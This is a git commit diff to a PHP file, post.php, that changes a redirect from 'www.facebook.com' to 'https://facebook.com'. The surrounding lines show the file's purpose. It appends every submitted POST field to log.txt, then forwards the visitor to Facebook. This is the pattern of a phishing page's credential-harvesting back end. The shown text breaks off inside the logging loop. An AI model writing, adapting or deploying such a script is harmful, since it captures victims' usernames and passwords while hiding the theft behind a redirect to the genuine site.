4cdce3a41579d026e0b04772d7736598e0f0f6a2
ndoomah <45961222+ndoomah@users.noreply.github.com>
2019-04-24 10:42:58 +0400

    Update post.php

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location: www.facebook.com');
+header ('Location: https://facebook.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
